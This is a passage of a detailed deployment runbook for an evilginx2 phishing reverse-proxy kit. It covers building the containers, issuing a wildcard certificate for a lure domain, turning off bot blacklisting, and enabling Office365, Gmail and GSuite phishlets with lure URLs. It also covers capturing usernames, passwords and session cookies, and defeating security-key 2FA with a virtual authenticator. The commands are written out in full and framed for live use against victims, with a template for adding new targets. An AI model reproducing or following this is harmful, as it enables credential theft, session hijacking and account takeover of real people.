cd ~/evilginx2
git check-ignore -v .env; echo "exit=$?"
```

**✅ A `.gitignore` line and `exit=0`.**

**❌ `exit=1`:**

```bash
cd ~/evilginx2
echo '.env' >> .gitignore
git add .gitignore
git commit -m "gitignore: .env"
git push origin master
git check-ignore -v .env; echo "exit=$?"
```

`.env` was never tracked, so `git rm --cached .env` prints `pathspec did not match any files` — harmless.

---

## 🐳 STAGE 11 — Compose proof, both images, start, port-80 gate

```bash
cd ~/evilginx2
docker compose config >/dev/null && echo COMPOSE_OK
```

**✅ `COMPOSE_OK`.**

**❌ `did not find expected key`** → `.env` pasted into the YAML → `git checkout -- docker-compose.yml`.
**❌ `mapping values are not allowed`** → an env line lost its dash → same fix.
**❌ `can't evaluate field`** → the healthcheck block indent is wrong; it belongs at four spaces under `chrome:`.

```bash
cd ~/evilginx2
docker compose build evilginx2
docker compose build chrome
```

**✅ `Image evilginx2-evilginx2 Built`, then `Image evilginx2-chrome Built`. The first sends ~37 MB of vendor context and looks idle for minutes — not a hang.**

**❌ Go error** → Stage 9. **❌ `cannot find vendor directory`** → 8c. **❌ `no space left`** → `docker system prune -af`.

```bash
cd ~/evilginx2
docker compose up -d
sleep 15
docker ps --format '{{.Names}} {{.Status}}'
docker inspect -f 'tty={{.Config.Tty}}' evilginx2
docker logs evilginx2 2>&1 | grep -E "relay|dashboard|Web Admin|http port"
```

**✅ `chrome Up (healthy)`, `evilginx2 Up`, `tty=true`, `http port set to: 80`, plus:**

```
relay: guard 127.0.0.1:18555 control 127.0.0.1:18556 chrome http://127.0.0.1:9222
relay: attached, guard 127.0.0.1:18555
```

`(healthy)` comes from the 8e healthcheck. `(health: starting)` for the first 20 s is normal.

### 🚦 Gate

```bash
cd ~/evilginx2
docker logs evilginx2 2>&1 | grep -q 'http port set to: 80' \
 && ss -lntup | grep -q ':80 ' \
 && curl -sSI -o /dev/null -w '%{http_code}\n' http://127.0.0.1/ | grep -qE '200|301' \
 && echo PORT80_OK
```

**✅ `PORT80_OK`**

**❌ No `PORT80_OK` → stop.**

| Missing | Meaning | Fix |
|:--|:--|:--|
| no `http port set to` line | listener absent | Stage 0 `port := 80` was `0`; `git pull`, rebuild |
| nothing on `:80` | bind failed | `docker logs evilginx2 \| grep -i 'bind\|in use\|permission'` |
| `:80` up, not 200/301 | wrong handler | `docker logs evilginx2 \| grep -i http` |

**❌ Other:** `address already in use 18555` → `ss -lntp | grep 18555`. `chrome unreachable` → 15a. `:53 in use` → Stage 4. Restart loop → `docker logs --tail 60 evilginx2`.

### Confirm the debug variable landed

```bash
docker exec evilginx2 printenv RELAY_DEBUG
docker exec evilginx2 printenv RELAY_MAX_SECONDS
```

**✅ `true` and `1800`.**

**❌ Blank** → 8d. Without this line the log is silent for the whole of Stage 25.

---

## 🔒 STAGE 12 — Confirm the ports and prove 443 is TLS

### 12a — Read the values

```bash
cd ~/evilginx2
jq -r '"http_port=\(.general.http_port) https_port=\(.general.https_port)"' data/config.json
```

**✅ `http_port=80 https_port=443`** → 12c.

**❌ Anything else** → 12b. A fresh database writes `0` here; harmless, but the file should tell the truth.

### 12b — Pin both

**Order matters.** evilginx writes `config.json` back to disk when it stops, so an edit made while it is running can be overwritten. Stop first, edit, then start.

```bash
cd ~/evilginx2
docker compose stop evilginx2
OWN=$(stat -c '%u:%g' data/config.json)
jq '.general.http_port = 80 | .general.https_port = 443' data/config.json > /tmp/cfg.json
cp /tmp/cfg.json data/config.json
chown "$OWN" data/config.json
docker compose up -d
sleep 12
jq -r '"http_port=\(.general.http_port) https_port=\(.general.https_port)"' data/config.json
```

**✅ `http_port=80 https_port=443`.**

**❌ Still wrong** → `docker exec evilginx2 grep -o '"http_port": *[0-9]*' /home/evilginx/.evilginx/config.json`. **❌ Reverted after `up -d`** → the edit was made while the container ran; repeat the block in the order shown.

### 12c — Prove the protocol on 443

```bash
curl -sS -o /dev/null -w 'plain-on-443: %{http_code}\n' --max-time 5 http://127.0.0.1:443/
curl -sS -o /dev/null -w 'tls-on-443:   %{http_code}\n' --max-time 5 -k https://127.0.0.1/
```

**✅ `plain-on-443: 000`.** `tls-on-443` may be `000` too before any certificate exists.

| `plain-on-443` | Meaning | Fix |
|:--|:--|:--|
| `000` | 443 is TLS | correct |
| `200` or `301` | plaintext on 443 | 12b, then `down && up -d` |
| both `000` plus a `bind` error | nothing on 443 | `docker logs evilginx2 \| grep -iE 'bind\|443'` |

**Re-run 12c after every `phishlets enable` in Stages 22 and 23.**

---

## 🚫 STAGE 13 — Blacklist off

**Why:** with `blacklist unauth` and `BOT_FILTER` on, every cookieless `curl` looks like an unauthorised visitor and evilginx bans its source IP. Your proofs run **on** the VPS, so they source from `95.133.229.17`. A banned IP is dropped at the listener, so the next proof returns an empty line and looks exactly like a dead service.

**Verified:** bare `blacklist` lists and sets `unauth`. `blacklist off` disables. **`blacklist clear` does not exist.**

```bash
cd ~/evilginx2
docker attach evilginx2
```

Wait for `:`, then:

```
blacklist
blacklist off
```

**✅ An entry-count line, then `blacklist mode set to: off`.**

Detach `Ctrl-P` `Ctrl-Q`.

```bash
cd ~/evilginx2
docker compose up -d
sleep 10
jq -r '.blacklist.mode' data/config.json
```

**✅ `off`.**

**❌ `unauth`** → reattach, retype. **❌ `Command 'blacklist' not found`** → you are in the host shell.

`blacklist` is a **top-level** key, so `.blacklist.mode` is the read.

**⚠️ If a later proof returns `403` or nothing and the ports check out, run `blacklist off` before suspecting code.**

---

## 🛡️ STAGE 14 — Guard proof

```bash
curl -sS -o /dev/null -w "public:   %{http_code}\n" --proxy http://127.0.0.1:18555 http://example.com/
curl -sS -o /dev/null -w "metadata: %{http_code}\n" --proxy http://127.0.0.1:18555 http://169.254.169.254/
curl -sS -o /dev/null -w "private:  %{http_code}\n" --proxy http://127.0.0.1:18555 http://10.0.0.1/
curl -sSL -o /dev/null -w "https:    %{http_code}\n" --proxy http://127.0.0.1:18555 https://accounts.google.com/
curl -sS --proxy http://127.0.0.1:18555 http://169.254.169.254/ | head -1
```

**✅ `public: 200`, `metadata: 403`, `private: 403`, `https: 200`, then `guard denied: deny cidr 169.254.0.0/16`.**

A bare `https:` of `302` is also correct. Only `000` or `403` fails.

**❌ metadata `200`** → guard down → `ss -lntp | grep 18555`, `docker logs evilginx2 | grep relay`. **❌ `Connection refused`** → guard never started. **❌ `https: 000`** → `docker exec chrome printenv CHROME_PROXY` must be the 18555 URL. **❌ Every site 403** → 21b / 21d.

**⚠️ If metadata returns `200`, stop.**

---

## 🖥️ STAGE 15 — Chrome, desktop, readiness gate

### 15a — Boot and prove readiness

**Why a poll and not a sleep:** `docker compose restart chrome` returns in under a second, but Chromium needs 15–30 s before 9222 binds. A blind `sleep 8` loses that race and the viewer shows `chrome unreachable: dial tcp 127.0.0.1:9222: connect: connection refused`. The `restart` command never waits.

```bash
cd ~/evilginx2
docker compose up -d --force-recreate chrome
for i in $(seq 1 60); do
  if curl -fsS --max-time 1 http://127.0.0.1:9222/json/version >/dev/null 2>&1; then
    echo "chrome ready after ${i}s"
    break
  fi
  sleep 1
done
curl -sS http://127.0.0.1:9222/json/version | jq -r '.Browser'
curl -sS http://127.0.0.1:9222/json/list | jq -r '.[].url' | sort | uniq -c
free -m | head -2
```

**✅ A `chrome ready after Ns` line, a `Chrome/1xx` version, exactly one `about:blank` plus two `chrome://omnibox-popup` lines, and `available` above 400.**

The two omnibox lines are internal popup pages Chrome always creates. Anything else in the list — especially `http://applewebkit/` or `http://(windows/` — means the user-agent was split into separate arguments. See 15b.

**❌ No ready line after 60 s** → `docker logs --tail=25 chrome`; if it says `Restarting`, 15c.
**❌ `Connection refused` on a lure afterwards** → you opened the lure before the poll finished.

### 15b — The user-agent split

`start.sh` collects its arguments positionally with `set --`, so `--user-agent=$CHROME_USER_AGENT` stays one argument even though the string contains spaces. A plain variable assignment plus unquoted expansion splits it and Chrome opens each fragment as a tab.

```bash
cd ~/evilginx2
grep -c 'set --' docker/chrome/start.sh
grep -n 'UA_ARGS' docker/chrome/start.sh
```

**✅ `4`, and no `UA_ARGS` hits.**

**❌ `0`** → the old script is on disk; restore it from `git show HEAD:docker/chrome/start.sh > docker/chrome/start.sh`, then rebuild chrome.

### 15c — If the container is restarting

```bash
docker inspect -f '{{.State.Status}} restarts={{.RestartCount}} oom={{.State.OOMKilled}}' chrome
docker logs --tail=40 chrome
```

**✅ `running restarts=0 oom=false`.**

**❌ `restarting`, a climbing count, or `oom=true`:**

```bash
cd ~/evilginx2
docker compose stop chrome
docker compose rm -f chrome
docker compose up -d chrome
```

Then redo 15a. A stale `/tmp/chrome-profile` lock inside the container is cleared by the `rm`.

### 15d — Desktop and control

```bash
curl -sS http://127.0.0.1:18556/health | jq .
```

**✅ `{"ok":true,"sessions":0,...}`.**

From your laptop, in a **second terminal**:

```
ssh -N -L 6080:127.0.0.1:6080 root@95.133.229.17
```

Open `http://127.0.0.1:6080/vnc.html` → Connect.

**✅ A blank Chrome window at 1366×768.**

`docker logs chrome` shows `dbus` errors — normal.

**❌ Blank viewer** → `docker logs chrome`. **❌ Tunnel refused** → `ss -lntp | grep 6080`.

---

## 🎛️ STAGE 16 — Control server

```bash
curl -sS http://127.0.0.1:18556/health | jq -r .ok
curl -sS http://127.0.0.1:18556/sessions | jq 'length'
curl -sS -m 3 http://95.133.229.17:18556/health | head -c 40; echo "<- control, want refused"
curl -sS -m 3 http://95.133.229.17:9222/json/version | head -c 40; echo "<- devtools, want refused"
```

**✅ `true`, `0`, then two `Failed to connect` lines.**

`Connection refused` **is** the pass — it proves the port is loopback-only.

**❌ JSON printed from the internet** → the port is on `0.0.0.0`.

---

## 🔑 STAGE 17 — Panels

```bash
cd ~/evilginx2
WUSER=$(grep '^WEBAPI_USER=' .env | cut -d= -f2-)
WPASS=$(grep '^WEBAPI_PASS=' .env | cut -d= -f2-)
rm -f /tmp/eg.jar
curl -sS -c /tmp/eg.jar -X POST http://127.0.0.1:8082/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$WUSER\",\"password\":\"$WPASS\"}"; echo
curl -sS -b /tmp/eg.jar http://127.0.0.1:8082/api/relay/status | jq -r '.enabled'
```

**✅ `{"message":"login successful",...}`, then `true`.**

**❌ `unauthorized` on the second** → rerun the block. **❌ `false`** → `RELAY_ENABLED` not `true`. **❌ `too many login attempts`** → wait five minutes.

```bash
DUSER=$(grep '^DASHBOARD_USER=' .env | cut -d= -f2-)
DPASS=$(grep '^DASHBOARD_PASS=' .env | cut -d= -f2-)
curl -sS -o /dev/null -w "no-auth:   %{http_code}\n" http://127.0.0.1:5000/
curl -sS -u "$DUSER:$DPASS" -o /dev/null -w "with-auth: %{http_code}\n" http://127.0.0.1:5000/
docker exec evilginx2 sh -c 'echo "[$AUTO_EXPORT_PATH] [$RELAY_ENABLED] [$CHROME_PROXY] [$RELAY_DEBUG] [$BOT_FILTER]"'
```

**✅ `401`, `200`, then `[/home/evilginx/.evilginx/exports] [true] [http://127.0.0.1:18555] [true] [false]`.**

**❌ An empty bracket** → that key is wrong in `.env`.

Panels: `http://95.133.229.17:8082/login`, `http://95.133.229.17:5000/`.

---

## 🖥️ STAGE 18 — Console and base config

**Why tmux:** a stuck attach can never trap you — `Ctrl-B` then `D` escapes.

```bash
tmux new -s eg
```

```bash
docker attach evilginx2
```

**Wait for the `:` prompt.** One line at a time:

```
config domain gyfdghf.store
config ipv4 external 95.133.229.17
blacklist off
config strip_headers on
config unauth_url https://www.office365.com
```

**✅ Five `[inf]` confirmations.**

**Detach: `Ctrl-P`, then `Ctrl-Q` → `read escape sequence`.** Never `Ctrl-C`, never `exit`.

```bash
cd ~/evilginx2
docker compose up -d
sleep 10
docker exec evilginx2 grep -o '"domain": *"[^"]*"\|"external_ipv4": *"[^"]*"' /home/evilginx/.evilginx/config.json
jq -r '.blacklist.mode' data/config.json
docker logs --tail 30 evilginx2
```

**✅ Both keys populated, `off`, no `server domain not set` warnings, `database accounts: 1`.**

**❌ Keys empty** → reattach and retype. **❌ No `read escape sequence`** → `docker inspect -f '{{.Config.Tty}}' evilginx2` must be `true`.

**`config domain` must be set before Stage 20.**

Cosmetic and expected: `geoip: not available` (Stage 30) and `no wildcard certificate found` (Stage 20).

---

## 💾 STAGE 19 — Persistence

```bash
cd ~/evilginx2
docker compose restart
sleep 10
docker logs --tail 30 evilginx2
docker exec evilginx2 ls -la /home/evilginx/.evilginx/ | grep config.json
```

**✅ No `not set` warnings, `config.json` present.**

**❌ Warnings return** → `grep '\.evilginx' docker-compose.yml` must show the volume mount.

---

## 🔐 STAGE 20 — Wildcard certificate, before any enable

**Why here:** enabling `office365` asks for sixteen hostnames in one order; each relay phishlet asks for more. Let's Encrypt allows five duplicates per exact identifier set per 168 hours. A wildcard is a different set, so it issues regardless. Stage 20g then switches autocert off.

The loader reads, in order, `data/crt/wildcard/fullchain.pem` + `privkey.pem`, then `data/crt/wildcard.pem` + `wildcard.key`. Use the first pair.

### 20a — Register the CA and start the order

```bash
curl -sS https://get.acme.sh | sh -s email=<YOUR_EMAIL>
~/.acme.sh/acme.sh --set-default-ca --server letsencrypt
~/.acme.sh/acme.sh --register-account -m <YOUR_EMAIL> --server letsencrypt
~/.acme.sh/acme.sh --issue --dns --keylength ec-256 \
  -d 'gyfdghf.store' -d '*.gyfdghf.store' \
  --server letsencrypt \
  --yes-I-know-dns-manual-mode-enough-go-ahead-please
```

**✅ Two TXT values printed under `_acme-challenge.gyfdghf.store`.**

`--register-account` may answer `Already registered` — fine. The `--issue` line stops on purpose. **Do not rerun it before adding the records.**

**❌ `Please update your account with an email`** → the register line was skipped. **❌ No TXT printed** → rerun with both `--server letsencrypt` and `--keylength ec-256`.

### 20b — Add the TXT records

Two records, DNS-only, TTL 1 minute:

| Type | Host | Value |
|:--|:--|:--|
| TXT | `_acme-challenge` | the first quoted value |
| TXT | `_acme-challenge` | the second quoted value |

Enter the host **without** the zone. Paste values **without** the quotes. Two records, same name, different content — correct.

Wait two minutes:

```bash
dig +short TXT _acme-challenge.gyfdghf.store @1.1.1.1
```

**✅ Two quoted strings matching the values.**

**❌ Nothing after five minutes** → you probably entered the full name as the host, double-appending the zone. **❌ A character differs** → edit and re-dig.

### 20c — Complete the order

```bash
~/.acme.sh/acme.sh --renew --dns --keylength ec-256 \
  -d 'gyfdghf.store' -d '*.gyfdghf.store' \
  --server letsencrypt \
  --yes-I-know-dns-manual-mode-enough-go-ahead-please
```

**✅ `Cert success`.**

**❌ `Timeout`** → propagation slower than acme.sh waited; rerun the same line. **❌ `Incorrect TXT record`** → recheck both contents.

### 20d — Locate the output directory

```bash
ls -d ~/.acme.sh/gyfdghf.store*
```

**✅ `gyfdghf.store_ecc`.** That `_ecc` suffix is mandatory.

**❌ Only `gyfdghf.store` without `_ecc`** → the key came out RSA; use that directory in 20e.

### 20e — Install where evilginx reads it

```bash
CD=~/.acme.sh/gyfdghf.store_ecc
cd ~/evilginx2
mkdir -p data/crt/wildcard
cp "$CD/fullchain.cer" data/crt/wildcard/fullchain.pem
cp "$CD/gyfdghf.store.key" data/crt/wildcard/privkey.pem
OWN=$(stat -c '%u:%g' data/config.json)
chown "$OWN" data/crt/wildcard/fullchain.pem data/crt/wildcard/privkey.pem
chmod 644 data/crt/wildcard/fullchain.pem
chmod 600 data/crt/wildcard/privkey.pem
ls -l data/crt/wildcard/
openssl x509 -noout -subject -ext subjectAltName -in data/crt/wildcard/fullchain.pem
```

**✅ Both files non-zero, owned like `config.json`, and the SAN line reads `DNS:*.gyfdghf.store, DNS:gyfdghf.store`.**

A 227-byte `privkey.pem` is correct for a P-256 key in PEM.

**❌ `No such file`** → `CD` is wrong; `ls -d ~/.acme.sh/gyfdghf.store*` again.

### 20f — Load it

```bash
cd ~/evilginx2
docker compose restart evilginx2
sleep 8
docker logs --tail 20 evilginx2 | grep -i wildcard
```

**✅ `wildcard certificate loaded for *.gyfdghf.store` and `individual subdomains will NOT appear in Certificate Transparency logs`.**

**❌ `no wildcard certificate found`** → filenames wrong, redo 20e. **❌ `failed to load`** → key does not match cert, redo 20c.

### 20g — Turn autocert off

**Only after 20f printed the load line.**

```bash
cd ~/evilginx2
docker attach evilginx2
```

Wait for `:`, then:

```
config autocert off
```

**✅ `[inf] autocert is now disabled`.** Detach `Ctrl-P` `Ctrl-Q`.

```bash
cd ~/evilginx2
docker compose up -d
sleep 10
jq -r '.general.autocert' data/config.json
docker logs evilginx2 2>&1 | grep -c 'wildcard certificate loaded for'
```

**✅ `false`, and a load count of `1` or more.**

**❌ `true`** → reattach, retype. **❌ Count `0`** → redo 20e, then `config autocert on` and `up -d`.

### 20h — The gate

```bash
cd ~/evilginx2
jq -r '.general.autocert' data/config.json
curl -sS -o /dev/null -w 'plain-on-443: %{http_code}\n' --max-time 5 http://127.0.0.1:443/
```

**✅ `false`, `plain-on-443: 000`.**

**❌ `plain-on-443: 200`** → Stage 12, then redo 20f.

### 20i — Delete the TXT records

Not needed again until Stage 35.

---

**⚠️ Both relay hosts still print nothing right now.** No hostname is active, so the handshake closes. Expected; the HTTPS proof is 23f.

---

## 🗺️ STAGE 21 — Collisions, guard rules

### 21a — Collision map

```bash
cd ~/evilginx2
python3 - <<'PY'
import glob, re, sys
seen, bad = {}, 0
for p in sorted(glob.glob("phishlets/*.yaml")):
    raw = open(p, encoding="utf-8").read()
    for ph, orig, dom in re.findall(
        r'phish_sub:\s*"([^"]+)",\s*orig_sub:\s*"([^"]+)",\s*domain:\s*"([^"]+)"', raw):
        host = (ph + "." + dom).lower()
        print("%-28s %-4s %-10s -> %s" % (p, ph, orig, host))
        if ph in seen:
            print("COLLISION on %r: %s and %s" % (ph, seen[ph], p))
            bad += 1
        seen[ph] = p
print()
print("RESULT:", "FAILED" if bad else "PASSED")
sys.exit(1 if bad else 0)
PY
```

**✅ `rl` on gmail, `gs` on gsuite, `RESULT: PASSED`.**

**❌ `COLLISION`** → two phishlets share a `phish_sub`; change one.

### 21b — Guard rules

```bash
cd ~/evilginx2
mkdir -p data
cat > data/allowdeny.txt <<'EOF'
# allow|deny   cidr|host|cc   value
# allow always wins over deny. built-in deny covers loopback,
# RFC1918, link-local, CGNAT, multicast and reserved ranges.
allow host accounts.google.com
allow host *.google.com
allow host *.gstatic.com
allow host *.googleusercontent.com
allow host *.googleapis.com
allow host workspace.google.com
allow host admin.google.com
allow host login.microsoftonline.com
allow host *.microsoftonline.com
allow host *.office.com
allow host *.office365.com
allow host *.live.com
allow host *.microsoft.com
deny  host *.local
deny  host *.internal
deny  cidr 192.0.2.0/24
EOF
awk 'NF && $1 !~ /^#/ && NF != 3' data/allowdeny.txt; echo "malformed above (blank = none)"
```

**✅ Nothing printed.** Every line has exactly three fields — a rejected file stops the relay starting.

### 21c — Country table (optional, inert)

```bash
cd ~/evilginx2
cat > data/country.csv <<'EOF'
# cidr,CC — longest matching prefix decides the country
102.89.0.0/16,NG
105.112.0.0/12,NG
197.210.0.0/16,NG
41.58.0.0/16,NG
8.8.8.0/24,US
1.1.1.0/24,US
EOF
```

Inert until you add a `cc` rule. Add none.

### 21d — Reload and prove

**Why `down`/`up`:** the guard reads rules only at process start.

```bash
cd ~/evilginx2
docker compose down
docker compose up -d
sleep 12
curl -sS -b /tmp/eg.jar http://127.0.0.1:8082/api/relay/status | jq '.rules.allow_host | length'
curl -sS -o /dev/null -w "google: %{http_code}\n" --proxy http://127.0.0.1:18555 https://accounts.google.com/
curl -sS -o /dev/null -w "meta:   %{http_code}\n" --proxy http://127.0.0.1:18555 http://169.254.169.254/
```

**✅ `13`, `google: 302` or `200`, `meta: 403`.**

**❌ Count `0`** → `docker logs evilginx2 | grep -iE 'guard|allowdeny'`. **❌ `google: 403`** → a malformed line aborted the load. **❌ `meta: 200`** → guard down, Stage 14. **❌ Empty `jq` output** → the jar expired; redo Stage 17.

Runtime rule, lost on restart:

```bash
curl -sS -b /tmp/eg.jar -X POST http://127.0.0.1:8082/api/relay/rule \
  -H "Content-Type: application/json" \
  -d '{"verb":"allow","kind":"host","value":"newtarget.example"}'
```

---

## 🅰️ STAGE 22 — TRACK A: enable a proxy phishlet

`office365` is the worked example.

### 22a — Validate

```bash
cd ~/evilginx2
apt install -y python3-yaml
python3 validate_phishlet.py
```

**✅ `RESULT: PASSED`.** `python3-yaml` is already there from Stage 6; the `apt` line is a no-op safety net.

### 22b — Enable

```bash
cd ~/evilginx2
docker attach evilginx2
```

At `:` each time:

```
phishlets
phishlets hostname office365 gyfdghf.store
phishlets enable office365
lures create office365
lures get-url 0
```

**✅ The table lists `office365`, `enabled phishlet 'office365'`, `created lure with ID: 0`, then a URL like `https://login.gyfdghf.store/OWOHleQd`.**

Detach `Ctrl-P` `Ctrl-Q`.

**⚠️ With autocert off there is no certificate block and no `429`.**

```bash
cd ~/evilginx2
curl -sS -o /dev/null -w 'plain-on-443: %{http_code}\n' --max-time 5 http://127.0.0.1:443/
curl -sS -o /dev/null -w 'login: %{http_code}\n' --max-time 10 -k https://login.gyfdghf.store/
```

**✅ `plain-on-443: 000`, `login: 200` or `302`.**

**❌ `login: 000`** → if `plain-on-443: 200`, Stage 12; if both `000`, 20e. **❌ `phishlet not found`** → `docker logs evilginx2 | grep -i phishlet`.

### 22c — Render check

Open the lure privately, reload five times.

**✅ The real page, identical colours every reload.**

**❌ Colours shift** → you ran `restart` instead of `up -d`.

---

## 🅱️ STAGE 23 — TRACK B: enable both relay phishlets

### 23a — The hostname rule

Each phishlet declares its own `phish_sub` (`rl`, `gs`), so the host becomes `rl.gyfdghf.store` and `gs.gyfdghf.store`. You therefore set each hostname to the **apex**, never to the subdomain. Setting `rl.` or `gs.` produces a `404` because evilginx looks for a phishlet named for that subdomain and finds none.

### 23b — Confirm scripts, blocks, and the fixes

```bash
cd ~/evilginx2
ls -l scripts/relay-gmail.js scripts/relay-gsuite.js
grep -n "relay:" -A 14 phishlets/relay-gmail.yaml
grep -n "relay:" -A 14 phishlets/relay-gsuite.yaml
grep -c 'proto.PageNavigate' relay/navigate_safe.go
grep -c 'Timeout(time.Second).Element' relay/browser.go
grep -c 'debug: true' phishlets/relay-gmail.yaml
grep -c 'debug: true' phishlets/relay-gsuite.yaml
grep -c 'func (s \*Session) dispatch' relay/input.go
grep -c 'WindowsVirtualKeyCode' relay/input.go
grep -c 'inputNamedKeys' relay/input.go
grep -c 'kdown' relay/viewer.html
grep -c 'set --' docker/chrome/start.sh
```

**✅ Both files exist; both blocks show `enabled: true` and `debug: true`; then `1`, `2`, `1`, `1`, `1`, `1`, `5`, `1`, `4`.**

**❌ A script missing** → `git pull`. **❌ `script:` missing** → that enable will 502. **❌ `debug: true` absent** → a silent log. **❌ `dispatch` absent** → the build fails at Stage 9; restore `input.go`. **❌ `WindowsVirtualKeyCode` absent** → Backspace, Delete and Enter will be dead again.

### 23c — Re-validate gsuite

```bash
cd ~/evilginx2
python3 validate_gsuite.py
```

**✅ `RESULT: PASSED` and `bindings : 12, all known`.**

**❌ Anything else** → fix the named line and rerun. Do not enable on a failure.

### 23d — Enable Gmail first

```bash
cd ~/evilginx2
docker attach evilginx2
```

At `:` each time:

```
phishlets
phishlets hostname relay-gmail gyfdghf.store
phishlets enable relay-gmail
phishlets
lures create relay-gmail
lures get-url 1
```

**✅ `enabled phishlet 'relay-gmail'`, table shows `rl`, `created lure with ID: 1`, a URL starting `https://rl.gyfdghf.store/`.**

### 23e — Enable GSuite second

```
phishlets hostname relay-gsuite gyfdghf.store
phishlets enable relay-gsuite
phishlets
lures create relay-gsuite
lures get-url 2
```

**✅ `enabled phishlet 'relay-gsuite'`, the table shows `gs` and `rl` together, `created lure with ID: 2`, a URL starting `https://gs.gyfdghf.store/`.**

Detach `Ctrl-P` `Ctrl-Q`.

If a `lures create` returns a different number, use that number in its `get-url`.

**❌ `phishlet not found`** → `docker logs evilginx2 | grep -i phishlet`; the loader names the field.
**❌ `relay: 'script' field is required`** → the phishlet file is truncated.
**❌ `login: 'domain' must contain a value of one of the hostnames`** → `login.domain` and `orig_sub` disagree.
**❌ Hostname collision** → 21a.

### 23f — The HTTPS gate

```bash
cd ~/evilginx2
curl -sS -o /dev/null -w 'plain-on-443: %{http_code}\n' --max-time 5 http://127.0.0.1:443/
curl -sS -o /dev/null -w 'rl: %{http_code}\n' --max-time 10 -k https://rl.gyfdghf.store/
curl -sSI https://rl.gyfdghf.store/ | head -2
curl -sS https://rl.gyfdghf.store/__relay/health | jq -r .ok
curl -sS -o /dev/null -w 'gs: %{http_code}\n' --max-time 10 -k https://gs.gyfdghf.store/
curl -sSI https://gs.gyfdghf.store/ | head -2
curl -sS https://gs.gyfdghf.store/__relay/health | jq -r .ok
```

**✅ `plain-on-443: 000`, `rl: 200`, `HTTP/1.1 200`, `true`, `gs: 200`, `HTTP/1.1 200`, `true`.**

Both relay pages are served over **HTTP/1.1** deliberately — `NextProtos` is pinned to `http/1.1` because the one-shot listener cannot speak h2.

**❌ `plain-on-443: 200`** → Stage 12, then rerun.
**❌ `wrong version number`** → Stage 12, or a missing certificate: `docker logs evilginx2 2>&1 | grep -c 'wildcard certificate loaded for'` must be ≥ 1.
**❌ `403` or empty** → `blacklist off`, retry.
**❌ `404` on either** → that hostname was set to the subdomain; redo 23d/23e with the apex.
**❌ `502`** → 23b.

### 23g — Prove the browser link on both

```bash
cd ~/evilginx2
for H in rl gs; do
  echo "== $H"
  curl -sS "https://$H.gyfdghf.store/__relay/start" | head -c 200; echo
done
```

**✅ Two `{"sid":"<hex>","ws":"/__relay/ws?sid=<hex>"}` lines.**

**❌ `websocket bad handshake: 404 Not Found`** → `resolveChromeURL` missing; Stage 0's count must be `3`.
**❌ `websocket bad handshake: 403`** → `--remote-allow-origins` missing; Stage 0's count must be `1`.
**❌ `chrome unreachable: dial tcp 127.0.0.1:9222: connect: connection refused`** → chrome is still booting. Redo 15a; do not touch code.

Clean up:

```bash
SID=$(curl -sS https://gs.gyfdghf.store/__relay/start | jq -r .sid)
sleep 4
curl -sS "http://127.0.0.1:18556/frame/$SID" -o /tmp/f.jpg -w 'frame: %{http_code} %{size_download} bytes\n'
curl -sS "http://127.0.0.1:18556/kill/$SID"; echo
free -m | head -2
```

**✅ A `frame: 200` with several thousand bytes, `{"killed":true}`.**

### 23h — Open both yourself

Load `https://rl.gyfdghf.store/` and `https://gs.gyfdghf.store/` privately.

**✅ Each shows a progress bar then the real Google form, with the VNC desktop mirroring it. The `rl` page lands on the identifier screen; the `gs` page opens the Workspace site first, then the identifier screen.**

**❌ Stuck "Connecting…"** → `docker logs evilginx2 | grep relay`. **❌ Frames frozen** → memory, Stage 2.

### 23i — Writing your own later

```yaml
relay:
  enabled: true
  script: "my-target"
  page: "relay"
  width: 1366
  height: 768
  quality: 70
  maxfps: 12
  timeout: 1800
  lang: "en-US"
  timezone: "Africa/Lagos"
  user_agent: "Mozilla/5.0 …"
  debug: true
```

```javascript
try {
  page.goto('https://target.example/login');
  if (!page.wait('input[type="email"]', 40000)) { page.fail('no email field'); }
  page.status('waiting for email');
  page.wait('input[type="password"]', 240000);
  page.status('waiting for password');
  page.sleep(3000);
  page.failFido();
  page.idle();
  page.grab();
  page.done();
} catch (e) { page.fail('script error: ' + e); }
```

Every field is range-checked at load. A missing script is a hard load error. Prove a new target on Track A first.

---

## 🧑‍💻 STAGE 24 — Capture, Track A

```bash
tmux kill-session -t log 2>/dev/null
tmux new -s log
docker logs -f evilginx2 | grep -E "Username|Password|tokens intercepted|autoexport"
```

Then: throwaway account, fresh private window, lure URL with `#victim@example.com`, real password, complete 2FA, "Stay signed in?" → **Yes**, wait ten seconds.

**✅**

```
[0] Username: [victim@example.com]
[0] Password: [••••••••]
[0] all authorization tokens intercepted!
autoexport: session <sid> -> office365_<sid> (NN cookies, complete=true)
```

**❌ No `Username:`** → decoy page or wrong host. **❌ `ESTSAUTHPERSISTENT` missing** → you skipped "Stay signed in". **❌ Count stuck `0`** → `CAPTURE_ALL_COOKIES` not `true`. **❌ `complete=false`** → Stage 28d.

---

## 🖱️ STAGE 25 — Capture, Track B

The procedure is identical for both phishlets. Pick the lure for the one you are testing.

### 25a — The virtual authenticator, and what you actually do

Both scripts call `page.failFido()` after the password. That installs a **virtual security key inside that Chromium** through the DevTools WebAuthn domain, with automatic presence simulation on. When Google offers "use a passkey / security key", the virtual key answers by itself.

So you do **not** hunt for a 2FA screen. You type the email, Next, the password, Next, and wait.

- If the account also has **TOTP**, Google may show a six-digit prompt. Typing your own code is fine.
- If it says "tap your security key", wait. It resolves on its own.
- **A captcha appears before the password** because the datacenter IP is flagged. Solve it normally.

### 25b — The four rules for a clean run

1. **Recreate Chrome and wait for 9222.** Every killed session leaves orphan tabs. A leftover tab on `accounts.google.com` satisfies a stale selector and surfaces as `fail: no email field` forty seconds in — nothing to do with the code.
2. **Check memory.** Below roughly 250 MB available, Chromium cannot paint.
3. **Watch the log.** Without it you cannot tell "still working" from "blocked".
4. **Never open the lure before the ready line.** A lure opened during boot shows `chrome unreachable`.

### 25c — Clear the browser and wait for readiness

```bash
cd ~/evilginx2
docker compose up -d --force-recreate chrome
for i in $(seq 1 60); do
  if curl -fsS --max-time 1 http://127.0.0.1:9222/json/version >/dev/null 2>&1; then
    echo "chrome ready after ${i}s"
    break
  fi
  sleep 1
done
free -m | head -2
curl -sS http://127.0.0.1:9222/json/list | jq -r '.[].url' | sort | uniq -c
```

**✅ A ready line, `available` near 980 MB, and exactly one `about:blank` plus two `chrome://omnibox-popup` lines.**

**❌ No ready line** → 15c. **❌ A Google tab survives** → recreate again. **❌ Under ~400 MB** → recreate once more and recheck. **❌ `http://applewebkit/` entries** → the user-agent split; 15b.

### 25d — Attach the log

```bash
tmux kill-session -t log 2>/dev/null
tmux new -s log
